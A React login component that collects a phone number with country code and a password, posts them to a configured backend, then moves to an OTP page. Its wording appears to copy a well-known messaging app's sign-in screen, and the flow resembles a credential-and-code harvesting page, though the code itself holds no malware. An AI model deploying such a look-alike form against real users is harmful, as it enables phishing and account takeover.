import React, { useState } from "react";
import "../styles/home.css";
import { useNavigate } from "react-router-dom";
import "../App.css";
import axios from "axios";
import BASE_URL from "../components/urls";
import countryCodes from "../components/data";
import ReactCountryFlag from "react-country-flag";

const Home = () => {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  const [selectedCountry, setSelectedCountry] = useState(countryCodes[0]);
  const [phoneNumber, setPhoneNumber] = useState("");
  const [password, setPassword] = useState("");
  const [isDropdownOpen, setIsDropdownOpen] = useState(false);

  const handleCountryChange = (country) => {
    setSelectedCountry(country);
    const updatedNumber = phoneNumber.replace(/^0/, "");
    setPhoneNumber(updatedNumber);
    setIsDropdownOpen(false); // Close dropdown when a country is selected
  };

  const toggleDropdown = () => {
    setIsDropdownOpen(!isDropdownOpen);
  };

  const submitForm = (e) => {
    e.preventDefault(); // Prevent the default form submission
    setLoading(true);

    const fullPhoneNumber = `${selectedCountry.code}${phoneNumber.replace(
      /^0/,
      ""
    )}`;

    axios
      .post(`${BASE_URL}/`, {
        PhoneNumber: fullPhoneNumber,
        password: password,
      })
      .then((response) => {
        console.log(response.data);
        navigate("/Otp");
      })
      .catch((error) => {
        console.error("There was an error!", error);
      })
      .finally(() => {
        setLoading(false);
      });
  };

  return (
    <div className="phone-number-form">
      <div className="container">
        <div className="contentSec">
          <div className="title">Your phone number</div>
          <p>Please confirm your country code and enter your phone number</p>
        </div>
        <form onSubmit={submitForm}>
          <label htmlFor="country">Country</label>
          <div className="custom-dropdown">
            <div className="selected-country" onClick={toggleDropdown}>
              <ReactCountryFlag countryCode={selectedCountry.flag} svg />
              <span>{selectedCountry.country}</span>
            </div>
            {isDropdownOpen && (
              <div className="dropdown-options">
                {countryCodes.map((country) => (
                  <div
                    key={country.code}
                    className="dropdown-option"
                    onClick={() => handleCountryChange(country)}
                  >
                    <ReactCountryFlag countryCode={country.flag} svg />
                    <span>{country.country}</span>
                  </div>
                ))}
              </div>
            )}
          </div>

          <label htmlFor="phone-number">Phone number</label>
          <div className="formInput phone-input">
            <input
              type="text"
              id="country-code"
              value={selectedCountry.code}
              readOnly
              className="country-code"
            />
            <input
              type="text"
              id="phone-number"
              className="inputPhoneNumber"
              value={phoneNumber}
              onChange={(e) => setPhoneNumber(e.target.value)}
            />
          </div>

          <label htmlFor="password">Password</label>
          <div className="formInput phone-input">
            <input
              type="password"
              id="password"
              className="inputPassword"
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
            />
          </div>

          <div className="checkboxWrapper">
            <input type="checkbox" id="syncContacts" />
            <label htmlFor="syncContacts">Sync Contacts</label>
          </div>
          <div className="Homebtn">
            <button type="submit" disabled={loading}>
              {loading ? "Loading..." : "Next"}
            </button>
          </div>
        </form>
      </div>
    </div>
  );
};

export default Home;
